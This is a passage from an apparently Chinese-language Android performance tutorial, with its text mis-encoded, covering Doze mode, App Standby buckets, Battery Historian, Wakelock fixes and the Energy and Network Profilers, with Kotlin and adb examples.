<p>è®¾å¤‡å¿…é¡»åŒæ—¶æ»¡è¶³ä»¥ä¸‹æ¡ä»¶æ‰ä¼šè¿›å…¥Doze:</p>
<ul>
<li>å±å¹•å…³é—­</li>
<li>è®¾å¤‡æœªåœ¨å……ç”µ</li>
<li>è®¾å¤‡é™ç½®(æ²¡æœ‰ç§»åŠ¨)</li>
<li>ä¸€æ®µæ—¶é—´æ²¡æœ‰ä½¿ç”¨(é€šå¸¸æ˜¯1-2å°æ—¶)</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3effc66bd29d4144bdb77e8c97d01ef9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769001863&amp;x-signature=hRj37XRJy%2F5z2nQGDVdH4U36HbE%3D" alt="14-02-doze-state-machine.png" loading="lazy"/></p>
<h4 data-id="heading-6">Dozeæ¨¡å¼çš„é™åˆ¶</h4>
<p>ä¸€æ—¦è¿›å…¥Doze,ç³»ç»Ÿä¼šæ–½åŠ ä»¥ä¸‹é™åˆ¶:</p>
<ol>
<li><strong>ç½‘ç»œè®¿é—®æš‚åœ</strong> - é™¤äº†é«˜ä¼˜å…ˆçº§FCMæ¶ˆæ¯</li>
<li><strong>WakeLockè¢«å¿½ç•¥</strong> - ä¸å†èƒ½å”¤é†’CPU</li>
<li><strong>Alarmå»¶è¿Ÿæ‰§è¡Œ</strong> - <code>setExact()</code>å’Œ<code>setWindow()</code>æ¨è¿Ÿåˆ°ç»´æŠ¤çª—å£</li>
<li><strong>WiFiæ‰«æåœæ­¢</strong></li>
<li><strong>JobSchedulerå’ŒSyncAdapteræš‚åœ</strong></li>
</ol>
<p>ä½†ç³»ç»Ÿä¼šå®šæœŸè¿›å…¥<strong>ç»´æŠ¤çª—å£</strong>(Maintenance Window),è®©åº”ç”¨æ‰§è¡Œå»¶è¿Ÿçš„ä»»åŠ¡:</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">åˆæ¬¡è¿›å…¥Dozeåçš„ç»´æŠ¤çª—å£æ—¶é—´é—´éš”:</span>
<span class="hljs-section">ç¬¬1æ¬¡: 1å°æ—¶å,ç»´æŠ¤çª—å£5åˆ†é’Ÿ</span>
<span class="hljs-section">ç¬¬2æ¬¡: 2å°æ—¶å,ç»´æŠ¤çª—å£5åˆ†é’Ÿ</span>
<span class="hljs-section">ç¬¬3æ¬¡: 4å°æ—¶å,ç»´æŠ¤çª—å£5åˆ†é’Ÿ</span>
<span class="hljs-section">ç¬¬4æ¬¡åŠä»¥å: æ¯6å°æ—¶ä¸€æ¬¡,ç»´æŠ¤çª—å£5åˆ†é’Ÿ</span>
</code></pre>
<h4 data-id="heading-7">å¦‚ä½•é€‚é…Dozeæ¨¡å¼</h4>
<p><strong>é”™è¯¯åšæ³• - å¼ºè¡Œä¿æŒè¿è¡Œ:</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// âŒ ä¸è¦ç”³è¯·ç™½åå•,è¿™åªæ˜¯ä¸ªä¸´æ—¶æ–¹æ¡ˆ</span>
<span class="hljs-keyword">val</span> intent = Intent().apply {
    action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
    <span class="hljs-keyword">data</span> = Uri.parse(<span class="hljs-string">"package:<span class="hljs-variable">$packageName</span>"</span>)
}
startActivity(intent)
</code></pre>
<p><strong>æ­£ç¡®åšæ³• - ä½¿ç”¨JobScheduler:</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// âœ… ä½¿ç”¨JobSchedulerè°ƒåº¦ä»»åŠ¡</span>
<span class="hljs-keyword">val</span> jobScheduler = getSystemService(Context.JOB_SCHEDULER_SERVICE) <span class="hljs-keyword">as</span> JobScheduler

<span class="hljs-keyword">val</span> job = JobInfo.Builder(JOB_ID, ComponentName(<span class="hljs-keyword">this</span>, MyJobService::<span class="hljs-keyword">class</span>.java))
    .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
    .setPersisted(<span class="hljs-literal">true</span>)  <span class="hljs-comment">// è®¾å¤‡é‡å¯åä»»åŠ¡ä¿ç•™</span>
    .build()

jobScheduler.schedule(job)
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyJobService</span> : <span class="hljs-type">JobService</span>() {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onStartJob</span><span class="hljs-params">(params: <span class="hljs-type">JobParameters</span>?)</span></span>: <span class="hljs-built_in">Boolean</span> {
        <span class="hljs-comment">// æ‰§è¡Œåå°ä»»åŠ¡</span>
        doWorkAsync {
            <span class="hljs-comment">// ä»»åŠ¡å®Œæˆåè°ƒç”¨</span>
            jobFinished(params, <span class="hljs-literal">false</span>)
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>  <span class="hljs-comment">// è¿”å›trueè¡¨ç¤ºä»»åŠ¡è¿˜åœ¨æ‰§è¡Œ</span>
    }

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onStopJob</span><span class="hljs-params">(params: <span class="hljs-type">JobParameters</span>?)</span></span>: <span class="hljs-built_in">Boolean</span> {
        <span class="hljs-comment">// ä»»åŠ¡è¢«ç³»ç»Ÿä¸­æ–­æ—¶è°ƒç”¨</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>  <span class="hljs-comment">// è¿”å›trueè¡¨ç¤ºéœ€è¦é‡æ–°è°ƒåº¦</span>
    }
}
</code></pre>
<p><strong>ä½¿ç”¨WorkManager(æ¨è):</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// âœ… æ›´æ¨èä½¿ç”¨WorkManager,å®ƒä¼šè‡ªåŠ¨å¤„ç†å…¼å®¹æ€§</span>
<span class="hljs-keyword">val</span> constraints = Constraints.Builder()
    .setRequiredNetworkType(NetworkType.CONNECTED)
    .setRequiresBatteryNotLow(<span class="hljs-literal">true</span>)
    .build()

<span class="hljs-keyword">val</span> syncWorkRequest = PeriodicWorkRequestBuilder&lt;SyncWorker&gt;(
    <span class="hljs-number">15</span>, TimeUnit.MINUTES
)
    .setConstraints(constraints)
    .build()

WorkManager.getInstance(context).enqueue(syncWorkRequest)
</code></pre>
<h3 data-id="heading-8">App Standby:å¾…æœºæ¡¶ç®¡ç†</h3>
<p>Android 9.0å¼•å…¥äº†App Standby Buckets(å¾…æœºæ¡¶)æœºåˆ¶,å°†åº”ç”¨åˆ†ä¸º5ä¸ªä¼˜å…ˆçº§æ¡¶:</p>



































<table><thead><tr><th align="left">æ¡¶åç§°</th><th align="left">è¯´æ˜</th><th align="left">é™åˆ¶</th></tr></thead><tbody><tr><td align="left"><strong>Active</strong></td><td align="left">ç”¨æˆ·æ­£åœ¨ä½¿ç”¨</td><td align="left">æ— é™åˆ¶</td></tr><tr><td align="left"><strong>Working Set</strong></td><td align="left">æœ€è¿‘ä½¿ç”¨è¿‡</td><td align="left">é™åˆ¶è¾ƒå°‘</td></tr><tr><td align="left"><strong>Frequent</strong></td><td align="left">ç»å¸¸ä½¿ç”¨</td><td align="left">ä¸­ç­‰é™åˆ¶</td></tr><tr><td align="left"><strong>Rare</strong></td><td align="left">å¾ˆå°‘ä½¿ç”¨</td><td align="left">ä¸¥æ ¼é™åˆ¶</td></tr><tr><td align="left"><strong>Never</strong></td><td align="left">ä»æœªä½¿ç”¨æˆ–è¢«ç¦ç”¨</td><td align="left">æä¸¥æ ¼é™åˆ¶</td></tr></tbody></table>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/07315c4cf40144008d10d5d5f7cdec45~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769001863&amp;x-signature=hXGC8nav29LvfszMD1sqLTUSHcs%3D" alt="14-03-app-standby-buckets.png" loading="lazy"/></p>
<p>ç³»ç»Ÿä¼šæ ¹æ®åº”ç”¨ä½¿ç”¨é¢‘ç‡è‡ªåŠ¨è°ƒæ•´æ¡¶åˆ†ç±»,åˆ†ç±»è¶Šä½,åå°ä»»åŠ¡æ‰§è¡Œæœºä¼šè¶Šå°‘:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// æŸ¥è¯¢å½“å‰åº”ç”¨æ‰€åœ¨çš„æ¡¶</span>
<span class="hljs-keyword">val</span> usageStatsManager = getSystemService(Context.USAGE_STATS_SERVICE) <span class="hljs-keyword">as</span> UsageStatsManager
<span class="hljs-keyword">val</span> bucket = usageStatsManager.appStandbyBucket

<span class="hljs-keyword">val</span> bucketName = <span class="hljs-keyword">when</span> (bucket) {
    UsageStatsManager.STANDBY_BUCKET_ACTIVE -&gt; <span class="hljs-string">"Active"</span>
    UsageStatsManager.STANDBY_BUCKET_WORKING_SET -&gt; <span class="hljs-string">"Working Set"</span>
    UsageStatsManager.STANDBY_BUCKET_FREQUENT -&gt; <span class="hljs-string">"Frequent"</span>
    UsageStatsManager.STANDBY_BUCKET_RARE -&gt; <span class="hljs-string">"Rare"</span>
    UsageStatsManager.STANDBY_BUCKET_NEVER -&gt; <span class="hljs-string">"Never"</span>
    <span class="hljs-keyword">else</span> -&gt; <span class="hljs-string">"Unknown"</span>
}

Log.d(<span class="hljs-string">"Standby"</span>, <span class="hljs-string">"Current bucket: <span class="hljs-variable">$bucketName</span>"</span>)
</code></pre>
<h2 data-id="heading-9">Battery Historian:ç”µé‡åˆ†æç¥å™¨</h2>
<p>Battery Historianæ˜¯Googleå®˜æ–¹çš„ç”µé‡åˆ†æå·¥å…·,èƒ½å¤Ÿä»¥<strong>å¯è§†åŒ–æ–¹å¼</strong>å±•ç¤ºè®¾å¤‡ç”µé‡æ¶ˆè€—çš„è¯¦ç»†ä¿¡æ¯ã€‚</p>
<h3 data-id="heading-10">ç¯å¢ƒæ­å»º</h3>
<h4 data-id="heading-11">æ–¹æ³•ä¸€:Dockeræ–¹å¼(æ¨è)</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. å®‰è£…Docker</span>
<span class="hljs-comment"># Linux: sudo apt install docker.io</span>
<span class="hljs-comment"># macOS: ä¸‹è½½Docker Desktop</span>

<span class="hljs-comment"># 2. æ‹‰å–Battery Historiané•œåƒ</span>
docker pull gcr.io/android-battery-historian/stable:3.1

<span class="hljs-comment"># 3. è¿è¡Œå®¹å™¨</span>
docker run -p 9999:9999 gcr.io/android-battery-historian/stable:3.1

<span class="hljs-comment"># 4. æµè§ˆå™¨æ‰“å¼€</span>
<span class="hljs-comment"># http://localhost:9999</span>
</code></pre>
<h4 data-id="heading-12">æ–¹æ³•äºŒ:æºç ç¼–è¯‘(éœ€è¦Goç¯å¢ƒ)</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. å®‰è£…Goè¯­è¨€ç¯å¢ƒ(1.11+)</span>
<span class="hljs-comment"># https://golang.org/dl/</span>

<span class="hljs-comment"># 2. è·å–æºç </span>
go get -d -u github.com/google/battery-historian/...

<span class="hljs-comment"># 3. è¿›å…¥ç›®å½•å¹¶è¿è¡Œ</span>
<span class="hljs-built_in">cd</span> <span class="hljs-variable">$GOPATH</span>/src/github.com/google/battery-historian
go run cmd/battery-historian/battery-historian.go

<span class="hljs-comment"># 4. æµè§ˆå™¨æ‰“å¼€</span>
<span class="hljs-comment"># http://localhost:9999</span>
</code></pre>
<h3 data-id="heading-13">æ•°æ®é‡‡é›†æµç¨‹</h3>
<h4 data-id="heading-14">1. é‡ç½®ç”µé‡ç»Ÿè®¡</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># é‡ç½®ç”µé‡ç»Ÿè®¡æ•°æ®</span>
adb shell dumpsys batterystats --reset
</code></pre>
<h4 data-id="heading-15">2. æ‹”æ‰USB,è¿›è¡Œæµ‹è¯•æ“ä½œ</h4>
<p>è¿™ä¸€æ­¥éå¸¸é‡è¦:<strong>å¿…é¡»æ‹”æ‰USBçº¿</strong>,å› ä¸ºå……ç”µçŠ¶æ€ä¼šå½±å“å¾ˆå¤šè¡Œä¸ºã€‚</p>
<p>æ‰§è¡Œä½ æƒ³åˆ†æçš„æ“ä½œ,æ¯”å¦‚:</p>
<ul>
<li>å¯åŠ¨åº”ç”¨å¹¶ä½¿ç”¨ä¸€æ®µæ—¶é—´</li>
<li>è®©åº”ç”¨åœ¨åå°è¿è¡Œ</li>
<li>è§¦å‘ç‰¹å®šåŠŸèƒ½</li>
</ul>
<h4 data-id="heading-16">3. å¯¼å‡ºç”µé‡æ•°æ®</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¯¼å‡ºå®Œæ•´çš„ç”µé‡ç»Ÿè®¡æ•°æ®</span>
adb bugreport bugreport.zip
</code></pre>
<p>è¿™ä¸ªå‘½ä»¤ä¼šç”Ÿæˆä¸€ä¸ªzipæ–‡ä»¶,åŒ…å«äº†è¯¦ç»†çš„ç”µé‡ä½¿ç”¨æ—¥å¿—ã€‚</p>
<h4 data-id="heading-17">4. ä¸Šä¼ åˆ°Battery Historianåˆ†æ</h4>
<p>æ‰“å¼€ <code>http://localhost:9999</code>,ä¸Šä¼  <code>bugreport.zip</code> æ–‡ä»¶,å°±å¯ä»¥çœ‹åˆ°å¯è§†åŒ–çš„åˆ†ææŠ¥å‘Šäº†ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c722e00e688a429a807acb047e578c35~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769001863&amp;x-signature=B3FPBdiLbzkSeFP%2BMFOZlHUu4NU%3D" alt="14-04-battery-historian-ui.png" loading="lazy"/></p>
<h3 data-id="heading-18">æŠ¥å‘Šè§£è¯»:å…³é”®æŒ‡æ ‡</h3>
<p>Battery Historiançš„æŠ¥å‘Šéå¸¸ä¸°å¯Œ,æˆ‘ä»¬é‡ç‚¹å…³æ³¨ä»¥ä¸‹å‡ ä¸ªå…³é”®æŒ‡æ ‡:</p>
<h4 data-id="heading-19">1. Battery Level(ç”µé‡æ›²çº¿)</h4>
<p>æœ€ä¸Šæ–¹çš„ç»¿è‰²æ›²çº¿æ˜¾ç¤ºç”µé‡å˜åŒ–ã€‚é™¡é™è¯´æ˜è€—ç”µå¿«,éœ€è¦é‡ç‚¹åˆ†æè¯¥æ—¶é—´æ®µã€‚</p>
<h4 data-id="heading-20">2. Screen(å±å¹•çŠ¶æ€)</h4>
<p>è“è‰²è¡¨ç¤ºå±å¹•äº®èµ·,ç°è‰²è¡¨ç¤ºç†„å±ã€‚å¸®åŠ©åŒºåˆ†å‰å°å’Œåå°è€—ç”µã€‚</p>
<h4 data-id="heading-21">3. Mobile Radio(ç§»åŠ¨ç½‘ç»œçŠ¶æ€)</h4>
<p>æ˜¾ç¤ºç½‘ç»œçŠ¶æ€:<code>active</code> &gt; <code>idle</code> &gt; <code>off</code>ã€‚é¢‘ç¹çš„activeçŠ¶æ€è¯´æ˜ç½‘ç»œè¯·æ±‚å¤šã€‚</p>
<h4 data-id="heading-22">4. GPS(å®šä½çŠ¶æ€)</h4>
<p>ç»¿è‰²è¡¨ç¤ºGPSå¼€å¯ã€‚å®šä½æ˜¯è€—ç”µå¤§æˆ·,è¦é¿å…æŒç»­å®šä½ã€‚</p>
<h4 data-id="heading-23">5. Wakelock(å”¤é†’é”)</h4>
<p>æ˜¾ç¤ºå“ªäº›åº”ç”¨æŒæœ‰Wakelockã€‚<strong>è¿™æ˜¯é‡ç‚¹</strong>,Wakelockæ»¥ç”¨æ˜¯è€—ç”µçš„ä¸»è¦åŸå› ä¹‹ä¸€ã€‚</p>
<h4 data-id="heading-24">6. App Usage(åº”ç”¨ä½¿ç”¨æƒ…å†µ)</h4>
<p>æ˜¾ç¤ºå„åº”ç”¨çš„å‰å°/åå°è¿è¡Œæ—¶é—´å’Œç”µé‡å æ¯”ã€‚</p>
<h3 data-id="heading-25">å®æˆ˜æ¡ˆä¾‹:å®šä½è€—ç”µå¼‚å¸¸</h3>
<p><strong>åœºæ™¯</strong>: ç”¨æˆ·åé¦ˆåå°è€—ç”µä¸¥é‡ã€‚</p>
<h4 data-id="heading-26">åˆ†ææ­¥éª¤</h4>
<ol>
<li><strong>æŸ¥çœ‹ç”µé‡æ›²çº¿</strong> - å‘ç°å¤œé—´ç”µé‡é™¡é™15%</li>
<li><strong>æ£€æŸ¥ScreençŠ¶æ€</strong> - ç¡®è®¤å±å¹•æ˜¯ç†„ç­çš„,æ’é™¤ç”¨æˆ·æ“ä½œ</li>
<li><strong>å®šä½æ—¶é—´æ®µ</strong> - åœ¨å‡Œæ™¨2ç‚¹åˆ°5ç‚¹ä¹‹é—´</li>
<li><strong>æ£€æŸ¥Wakelock</strong> - å‘ç°åº”ç”¨æŒæœ‰äº†å¤§é‡Wakelock</li>
<li><strong>æŸ¥çœ‹å…·ä½“Wakelockåç§°</strong> - <code>SyncService$WakeLock</code> æŒæœ‰äº†2å°æ—¶45åˆ†é’Ÿ!</li>
</ol>
<p><strong>é—®é¢˜å®šä½</strong>: åŒæ­¥æœåŠ¡çš„Wakelockæ²¡æœ‰æ­£ç¡®é‡Šæ”¾,å¯¼è‡´CPUæ— æ³•ç¡çœ ã€‚</p>
<p><strong>ä¿®å¤æ–¹æ¡ˆ</strong>:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// âŒ é”™è¯¯:Wakelockä¸€ç›´æŒæœ‰</span>
<span class="hljs-keyword">val</span> wakeLock = powerManager.newWakeLock(
    PowerManager.PARTIAL_WAKE_LOCK,
    <span class="hljs-string">"SyncService::WakeLock"</span>
)
wakeLock.acquire()  <span class="hljs-comment">// è·å–åå¿˜è®°é‡Šæ”¾</span>

<span class="hljs-comment">// âœ… æ­£ç¡®:è®¾ç½®è¶…æ—¶æ—¶é—´</span>
wakeLock.acquire(<span class="hljs-number">10</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000L</span>)  <span class="hljs-comment">// æœ€å¤šæŒæœ‰10åˆ†é’Ÿ</span>

<span class="hljs-comment">// âœ… æ›´å¥½:ä½¿ç”¨try-finallyç¡®ä¿é‡Šæ”¾</span>
wakeLock.acquire()
<span class="hljs-keyword">try</span> {
    doSync()
} <span class="hljs-keyword">finally</span> {
    <span class="hljs-keyword">if</span> (wakeLock.isHeld) {
        wakeLock.release()
    }
}
</code></pre>
<h2 data-id="heading-27">Wakelockæ·±åº¦åˆ†æä¸ä¼˜åŒ–</h2>
<h3 data-id="heading-28">Wakelockç±»å‹</h3>
<p>Androidæä¾›äº†å‡ ç§Wakelockç±»å‹,ä»å®Œå…¨å”¤é†’åˆ°ä»…ä¿æŒCPUè¿è¡Œ:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 1. PARTIAL_WAKE_LOCK - åªä¿æŒCPUè¿è¡Œ,å±å¹•å¯ä»¥å…³é—­(æœ€å¸¸ç”¨)</span>
<span class="hljs-keyword">val</span> partialWakeLock = powerManager.newWakeLock(
    PowerManager.PARTIAL_WAKE_LOCK,
    <span class="hljs-string">"MyApp::PartialWakeLock"</span>
)

<span class="hljs-comment">// 2. SCREEN_DIM_WAKE_LOCK - ä¿æŒå±å¹•ä½äº®åº¦(å·²åºŸå¼ƒ)</span>
<span class="hljs-comment">// 3. SCREEN_BRIGHT_WAKE_LOCK - ä¿æŒå±å¹•é«˜äº®åº¦(å·²åºŸå¼ƒ)</span>
<span class="hljs-comment">// 4. FULL_WAKE_LOCK - å®Œå…¨å”¤é†’(å·²åºŸå¼ƒ)</span>

<span class="hljs-comment">// ç°ä»£åšæ³•:ä½¿ç”¨WindowManager.LayoutParams</span>
window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
</code></pre>
<h3 data-id="heading-29">Wakelockæœ€ä½³å®è·µ</h3>
<h4 data-id="heading-30">1. å§‹ç»ˆè®¾ç½®è¶…æ—¶æ—¶é—´</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// âŒ å±é™©:æ²¡æœ‰è¶…æ—¶æ—¶é—´</span>
wakeLock.acquire()

<span class="hljs-comment">// âœ… å®‰å…¨:è®¾ç½®è¶…æ—¶(æ¯«ç§’)</span>
wakeLock.acquire(<span class="hljs-number">10</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000L</span>)  <span class="hljs-comment">// 10åˆ†é’Ÿåè‡ªåŠ¨é‡Šæ”¾</span>
</code></pre>
<h4 data-id="heading-31">2. ä½¿ç”¨WakefulBroadcastReceiver(æ—§API)</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyWakefulReceiver</span> : <span class="hljs-type">WakefulBroadcastReceiver</span>() {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onReceive</span><span class="hljs-params">(context: <span class="hljs-type">Context</span>, intent: <span class="hljs-type">Intent</span>)</span></span> {
        <span class="hljs-comment">// è‡ªåŠ¨è·å–Wakelock</span>
        <span class="hljs-keyword">val</span> componentName = startWakefulService(context, Intent(context, MyService::<span class="hljs-keyword">class</span>.java))
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyService</span> : <span class="hljs-type">IntentService</span>(<span class="hljs-string">"MyService"</span>) {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onHandleIntent</span><span class="hljs-params">(intent: <span class="hljs-type">Intent</span>?)</span></span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// å¤„ç†ä»»åŠ¡</span>
            doWork()
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-comment">// é‡Šæ”¾Wakelock</span>
            MyWakefulReceiver.completeWakefulIntent(intent)
        }
    }
}
</code></pre>
<h4 data-id="heading-32">3. ä½¿ç”¨WorkManager(ç°ä»£åšæ³•)</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// WorkManagerè‡ªåŠ¨ç®¡ç†Wakelock,æ— éœ€æ‰‹åŠ¨å¤„ç†</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyWorker</span>(context: Context, params: WorkerParameters) : Worker(context, params) {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">doWork</span><span class="hljs-params">()</span></span>: Result {
        <span class="hljs-comment">// ä»»åŠ¡æ‰§è¡ŒæœŸé—´,WorkManagerè‡ªåŠ¨æŒæœ‰Wakelock</span>
        doSyncWork()
        <span class="hljs-keyword">return</span> Result.success()
    }
}
</code></pre>
<h3 data-id="heading-33">æ£€æµ‹Wakelockæ»¥ç”¨</h3>
<h4 data-id="heading-34">ä½¿ç”¨adbå‘½ä»¤</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥çœ‹å½“å‰æ‰€æœ‰Wakelock</span>
adb shell dumpsys power | grep <span class="hljs-string">"Wake Locks"</span>

<span class="hljs-comment"># æŸ¥çœ‹è¯¦ç»†çš„Wakelockç»Ÿè®¡</span>
adb shell dumpsys batterystats | grep -A 20 <span class="hljs-string">"Wake lock"</span>
</code></pre>
<h4 data-id="heading-35">ä½¿ç”¨Battery Historian</h4>
<p>åœ¨Battery HistorianæŠ¥å‘Šä¸­,ç‚¹å‡» <strong>Wakelock</strong> è¡Œ,å¯ä»¥çœ‹åˆ°:</p>
<ul>
<li>æ¯ä¸ªWakelockçš„æŒæœ‰æ—¶é•¿</li>
<li>è§¦å‘æ¬¡æ•°</li>
<li>æŒæœ‰Wakelockçš„åº”ç”¨</li>
</ul>
<p>å¦‚æœå‘ç°æŸä¸ªWakelockæŒæœ‰æ—¶é—´è¶…è¿‡<strong>5åˆ†é’Ÿ</strong>,åŸºæœ¬å¯ä»¥åˆ¤å®šä¸ºæ»¥ç”¨ã€‚</p>
<h2 data-id="heading-36">Energy Profiler:å®æ—¶ç”µé‡ç›‘æ§</h2>
<p>Android Studio 3.0+å†…ç½®äº†Energy Profiler,å¯ä»¥å®æ—¶ç›‘æ§åº”ç”¨çš„ç”µé‡æ¶ˆè€—ã€‚</p>
<h3 data-id="heading-37">ä½¿ç”¨æ­¥éª¤</h3>
<ol>
<li>
<p><strong>æ‰“å¼€Android Studio Profiler</strong></p>
<ul>
<li>View â†’ Tool Windows â†’ Profiler</li>
<li>ç‚¹å‡» "+" é€‰æ‹©è®¾å¤‡å’Œåº”ç”¨</li>
</ul>
</li>
<li>
<p><strong>é€‰æ‹©Energy</strong></p>
<ul>
<li>ç‚¹å‡» "ENERGY" æ ‡ç­¾</li>
</ul>
</li>
<li>
<p><strong>æŸ¥çœ‹èƒ½è€—æ›²çº¿</strong></p>
<ul>
<li>ç»¿è‰²:ä½èƒ½è€—</li>
<li>é»„è‰²:ä¸­ç­‰èƒ½è€—</li>
<li>çº¢è‰²:é«˜èƒ½è€—</li>
</ul>
</li>
<li>
<p><strong>åˆ†æèƒ½è€—äº‹ä»¶</strong></p>
<ul>
<li>CPU</li>
<li>Network</li>
<li>Location</li>
<li>Wake Lock</li>
</ul>
</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/693c6c75a90248139e72650b279b9b24~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769001863&amp;x-signature=pOCrAGHxbPSWtUnHQEetTEX7f%2F0%3D" alt="14-05-energy-profiler-ui.png" loading="lazy"/></p>
<h3 data-id="heading-38">å®æˆ˜:å®šä½ç½‘ç»œè€—ç”µ</h3>
<p>Energy Profilerä¼šæ ‡è®°å‡ºé«˜èƒ½è€—çš„ç½‘ç»œè¯·æ±‚ã€‚ç‚¹å‡»æŸä¸ªç½‘ç»œäº‹ä»¶,å¯ä»¥çœ‹åˆ°:</p>
<ul>
<li>è¯·æ±‚URL</li>
<li>æ•°æ®é‡</li>
<li>æŒç»­æ—¶é—´</li>
<li>è°ƒç”¨å †æ ˆ</li>
</ul>
<p><strong>ä¼˜åŒ–å»ºè®®</strong>:</p>
<ul>
<li>åˆå¹¶å°è¯·æ±‚,å‡å°‘ç½‘ç»œå”¤é†’æ¬¡æ•°</li>
<li>ä½¿ç”¨æ‰¹é‡æ¥å£</li>
<li>ç¼“å­˜å¯å¤ç”¨æ•°æ®</li>
<li>åœ¨WiFiç¯å¢ƒä¸‹é¢„ä¸‹è½½</li>
</ul>
<h2 data-id="heading-39">ç½‘ç»œæ€§èƒ½ç›‘æ§</h2>
<h3 data-id="heading-40">Network Profilerä½¿ç”¨</h3>
<p>Network Profileræ˜¯Android Studioå†…ç½®çš„ç½‘ç»œåˆ†æå·¥å…·,å¯ä»¥å®æ—¶æŸ¥çœ‹:</p>
<ul>
<li>ç½‘ç»œè¯·æ±‚æ—¶é—´çº¿</li>
<li>ä¸Šä¼ /ä¸‹è½½é€Ÿåº¦</li>
<li>è¯·æ±‚è¯¦æƒ…(URLã€Headerã€Body)</li>
<li>è¯·æ±‚/å“åº”è€—æ—¶</li>
</ul>
<h4 data-id="heading-41">ä½¿ç”¨æ­¥éª¤</h4>
<ol>
<li><strong>æ‰“å¼€Profiler</strong> - View â†’ Tool Windows â†’ Profiler</li>
<li><strong>é€‰æ‹©Network</strong> - ç‚¹å‡» "NETWORK" æ ‡ç­¾</li>
<li><strong>è§¦å‘ç½‘ç»œè¯·æ±‚</strong> - ä½¿ç”¨åº”ç”¨,è§‚å¯Ÿç½‘ç»œæ›²çº¿</li>
<li><strong>ç‚¹å‡»è¯·æ±‚è¯¦æƒ…</strong> - æŸ¥çœ‹å®Œæ•´çš„Request/Responseä¿¡æ¯</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bf75460e65fe424496778c89f49d69b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769001863&amp;x-signature=4unV1Yblh25louxWww92wd11dck%3D" alt="14-06-network-profiler-ui.png" loading="lazy"/></p>
<h3 data-id="heading-42">ç½‘ç»œè´¨é‡ç›‘æ§å®ç°</h3>
<p>æ‰‹åŠ¨å®ç°ä¸€ä¸ªç®€å•çš„ç½‘ç»œè´¨é‡ç›‘æ§:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">NetworkQualityMonitor</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> context: Context) {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) <span class="hljs-keyword">as</span> ConnectivityManager

    <span class="hljs-comment">// ç½‘ç»œè´¨é‡ç­‰çº§</span>
    <span class="hljs-keyword">enum</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NetworkQuality</span> {
        EXCELLENT,  <span class="hljs-comment">// ä¼˜ç§€</span>
        GOOD,       <span class="hljs-comment">// è‰¯å¥½</span>
